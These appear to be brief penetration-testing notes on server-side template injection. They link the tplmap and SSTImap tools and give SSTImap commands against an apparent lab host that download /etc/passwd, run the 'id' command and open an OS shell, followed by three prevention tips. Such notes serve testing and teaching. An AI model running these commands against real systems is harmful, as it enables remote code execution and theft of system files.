https://github.com/epinna/tplmap
https://github.com/vladko312/SSTImap

```
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

## Prevention
- Ensure user input is never fed into the call to the template engine's rendering function
- Remove dangerous functions to disable RCE
- Separate the execution environment in which the template engine runs entirely from the web server (Docker container)
